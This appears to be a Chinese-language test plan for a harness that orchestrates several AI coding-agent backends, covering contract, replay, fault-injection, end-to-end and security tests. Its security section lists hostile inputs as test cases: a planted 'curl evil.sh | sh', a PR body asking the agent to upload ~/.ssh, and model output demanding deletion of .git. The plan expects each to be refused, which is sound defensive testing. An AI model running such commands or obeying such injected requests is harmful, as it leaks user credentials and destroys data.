# 测试计划（D8）

> 原则：**没有外部检查的产物不算交付**。本计划里的每条用例都必须能由 CI 或一条命令判定，不允许"人工看一眼"。
> 分层：L0 单元 → L1 契约 → L2 录制回放 → L3 故障注入 → L4 端到端 → L5 安全。

## 1. 测试金字塔

| 层 | 对象 | 手段 | 数量级 | 判定 |
|---|---|---|---|---|
| L0 单元 | ABI 编解码、事件折叠、路径校验、脱敏 | 纯函数单测 | 60+ | 覆盖率 ≥80%（核心模块） |
| L1 契约 | 每个适配器 vs 真实 CLI/SDK | 能力探针 + 握手 + 一轮 + 续接 + 中断 | 5 用例/后端 | 全部命令退出码 0 |
| L2 录制回放 | 事件流与状态机 | 录制真实会话帧 → 重放 → 比对最终状态与事件序列 | 4 后端各 3 条 | 快照一致（允许白名单字段漂移） |
| L3 故障注入 | 崩溃、超时、429、坏帧、磁盘满 | 代理层注入 + `kill -9` | 12+ | 错误分类正确、无悬挂、无重复执行 |
| L4 端到端 | PR 场景编排 | worktree + 自组织子代理 + 汇报 | 2 条 | `report.json` 字段齐全 + 断言无越权写 |
| L5 安全 | 凭据/路径/注入/沙箱 | 恶意输入集 | 10+ | 全部被拒且日志无泄漏 |

## 2. L1 契约测试（每个后端 5 条，参数化）

| 用例 | 步骤 | 断言 |
|---|---|---|
| CT-1 capability-probe | 启动适配器，读取版本与能力位 | 能力位与实际行为一致（写死期望表 `tests/fixtures/capabilities/<backend>.json`）；**codex 额外断言基线三元组**：host `codex --version` = 适配器实际调用二进制版本 = 0.164.x，且 `generate-json-schema` 计数 = 106/85/10（D-015） |
| CT-2 handshake | 建立会话（codex `thread/start`；claude SDK query；kimi/opencode ACP `initialize`+`session/new`） | 返回稳定 session id；重复建立不串号 |
| CT-3 one-turn | 发送「只回复 OK」，不修改文件 | 得到最终答案；usage 事件存在；耗时 < 上限；**opencode 规则（D-019）**：优先 `opencode-go/deepseek-v4.1-flash`；遇 401 `api_key_expired` 自动降级 `opencode/deepseek-v4.1-flash-free`，断言结果含 `degraded` + `model=free-fallback`，禁止静默；三通道（CLI run / HTTP v2 / ACP）至少各跑一条 |
| CT-4 resume | 第二轮携带第一轮 session id | 上下文延续（让模型复述第一轮内容）；无新建会话；**opencode 三通道各自验证**：CLI `-s <sessionID>`、HTTP `POST /api/session/{id}/prompt`、ACP `session/load`（ACP-only 面若未验证，标 `skipped:unverified` 而非 PASS） |
| CT-5 interrupt | 启动长任务后中断 | 在 N 秒内停止；返回 `aborted`；无残留进程 |
| CT-6 concurrency-runtime | 把运行时 `subagent.maxActiveSubagents` 依次设为 N、N+1、N-1（测试内可注入），各发起一波并发 | 兼容层上限**跟随运行时值变化**；超限返回 `limit.concurrency-exceeded`；源码静态检查无硬编码并发常量（D-016） |

## 3. L2 录制回放

- 录制：`tests/record/<backend>/<case>.jsonl`，每行 `{ts, dir, frame}`，来自真实会话（脱敏后入库；`tools/redact.py` 处理）。
- 回放：把录到的帧喂给适配器解析层，断言：
  1. 归一化事件序列与 `tests/golden/<backend>/<case>.events.json` 一致；
  2. 状态机终态一致；
  3. 未知事件被记 `protocol.bad-frame` 而不是崩溃。
- 漂移处理：产品升级后重录，diff 结果作为"协议变更报告"。

## 4. L3 故障注入

| 编号 | 注入 | 期望 |
|---|---|---|
| FI-1 | 子进程 `kill -9`（turn 中途） | 分类 `process.crashed`；恢复时可判断是否已执行；不重复跑 turn |
| FI-2 | stdout 半帧/坏 JSON | 丢弃该帧 + 记 `transport.frame-invalid`；不崩溃 |
| FI-3 | 429 / 401 / 5xx | 分类 `quota.rate-limited` / `auth.credential-rejected` / `internal.unexpected`；不无限重试（≤2 次，指数退避） |
| FI-4 | 无响应（hang） | 超时后 `transport.timeout`；进程组被清理 |
| FI-5 | 磁盘写满 | 写入失败可回滚；不产生半截会话文件 |
| FI-6 | 事件洪水（1e5 帧） | 折叠上限生效；父级消息数 ≤ 配置上限 |
| FI-7 | 会话 id 不存在 | `session.not-found`，降级新建并声明 |
| FI-8 | 并发同 cwd | 第二个写者被拒绝或串行化 |
| FI-9 | 凭据出现在 env | 脱敏断言：日志/事件/回报中不含 |
| FI-10 | 恶意 cwd（`/`、`..`、symlink） | `policy.sandbox-violation` 拒绝 |
| FI-11 | 递归派生子代理 | 深度上限触发，最深层被中断 |
| FI-12 | daemon 崩溃后重启 | 已加载会话可被 `list` 发现并恢复（若能力位支持） |

## 5. L4 端到端（验收场景）

### E2E-1 PR 编排（codex 为执行体）
1. `git worktree add .worktrees/pr-test`
2. 委派：「按 PR 描述完成改动；允许你自行组织子代理；最终输出 report.json 指定 schema」
3. 断言：
   - `.worktrees/pr-test` 之外无文件被修改（`git status` 比对 + `find -newer` 检查）
   - `report.json` 存在且字段齐全（`changed_files/tests/subagents/open_questions`）
   - 父会话新增消息数 ≤ 上限
   - 运行结束后无残留进程（`pgrep -f codex|claude|kimi|opencode` 为空）

### E2E-2 跨后端复核
- 后端 A 实现 → 后端 B 复核（只读）→ 两边结论差异被记录为 `disagreement` 事件。
- 断言：B 不修改任何文件；差异项进入 `open_questions`。

## 5.5 基线一致性用例（D-015）

| 编号 | 用例 | 期望 |
|---|---|---|
| BL-1 | `node scripts/assert-codex-baseline.mjs --expect 0.164.x` | host 与适配器二进制版本一致；schema 计数 106/85/10；不一致非零退出 |
| BL-2 | 升级窗口（C11）：升级前录制 → 升级后重放 | 事件序列在允许的白名单差异内；差异写「协议变更报告」 |
| BL-3 | 回滚：还原旧载荷备份 | `--version` 回到升级前、1 轮 smoke 通过 |

## 6. L5 安全用例

| 编号 | 用例 | 期望 |
|---|---|---|
| SEC-1 | 仓库内埋 "curl evil.sh \| sh" | 命令被拒；日志记录命中规则 |
| SEC-2 | PR 正文要求把 `~/.ssh` 打包上传 | 拒绝外发；报告为可疑 |
| SEC-3 | 配置 `cwd=/` | 启动拒绝 |
| SEC-4 | 默认配置跑一次 | 未产生任何文件写入（只读档） |
| SEC-5 | 注入假 token 到 env | 日志/事件/回报均无该值 |
| SEC-6 | 危险档位未显式开启 | 拒绝以 `bypassPermissions` 启动 |
| SEC-7 | MCP server 白名单外配置 | 启动拒绝 |
| SEC-8 | 模型输出要求删除 `.git` | 被 denylist 拒绝 |

## 7. 执行与门禁

```bash
pnpm -s test            # L0-L2
pnpm -s test:fault      # L3
pnpm -s test:security   # L5
pnpm -s e2e             # L4（需要真实额度，CI 里标记 nightly）
```

门禁规则：
1. L0–L3、L5 必须在每次 PR 全绿；
2. L4 允许 nightly，但发布前必须绿一次；
3. 任何 `unknown` 错误分类占比 > 5% 视为失败（说明映射不全）；
4. 录制回放的快照由脚本比对：golden 文件 + 白名单字段（`ts`/`requestId`/绝对路径）自动 diff，无白名单变更时零差异即通过；白名单变更须在 PR 中单独记录（禁止"人工看一眼"式放行）。

## 8. 测试数据与卫生

- 所有录制帧必须过 `tools/redact.py`（token、绝对路径、用户名、内部 URL）。
- 禁止把真实仓库内容提交为 fixture；用合成仓库 `fixtures/repo-mini`。
- 额度敏感用例（L4）标 `@quota`，默认跳过，显式 `--with-quota` 才跑。
- 每个后端失败用例最多重试 1 次（防额度浪费），重试结果单独记录。

## 9. 发布前场景回归（release gate）

> 目的：在每次正式发布前，用**人类使用路径**做一次可签收的回归，而不是逐条人工点界面。
> 位置：[`scenarios/`](../../scenarios/README.md)，默认离线、零额度，约 15 秒。

```bash
node scenarios/run.mjs                # 12 个场景 + 11 条门禁
node scenarios/run.mjs --strict-known # 已知缺口也阻塞（发布签收推荐）
node scenarios/run.mjs --live         # 额外跑真实后端 smoke（耗额度）
```

判定：

- 场景覆盖 S01–S12：冷启动 fail-closed、首个只读任务、追问/游标、中断、重启续接、
  并发、护栏、四后端巡检、密钥卫生、回滚、发布一致性、真实装配；
- 门禁 G01–G11 复用本计划的 L0–L4 命令与仓库闸门；
- 已存在的产品缺口登记在 `scenarios/known-issues.json`：`observed=true` 不阻塞（`--strict-known` 阻塞），
  `observed=false` 判失败（强制删除已修复条目）；
- 报告：`scenarios/out/release-report.{json,md}`；`release.yml` 已在构建插件前执行本套件。
